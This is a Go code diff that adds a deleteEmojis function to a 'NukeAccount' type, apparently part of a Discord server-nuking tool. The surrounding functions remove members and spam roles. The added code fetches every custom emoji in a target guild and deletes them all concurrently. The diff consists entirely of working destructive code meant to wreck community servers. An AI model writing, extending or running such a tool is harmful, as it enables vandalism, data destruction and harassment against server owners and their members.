@@ -127,6 +127,23 @@ func (na NukeAccount) removeMembers() error {
 	logger.Infof("Removed %d/%d members\n", goodRemoves, targetRemoves)
 	return nil
 }
+func (na NukeAccount) deleteEmojis() error {
+
+	emojiWg := sync.WaitGroup{}
+	emojis, err := na.Session.GuildEmojis(na.Config.GuildID)
+	if err != nil {
+		return err
+	}
+	for _, emoji := range emojis {
+		emojiWg.Add(1)
+		go func(emojiID string) {
+			na.Session.GuildEmojiDelete(na.Config.GuildID, emojiID)
+			emojiWg.Done()
+		}(emoji.ID)
+	}
+	emojiWg.Wait()
+	return nil
+}
 func (na NukeAccount) roleSpam() error {
 	randGen := rand.New(rand.NewSource(time.Now().UnixNano()))
 	wg := sync.WaitGroup{}
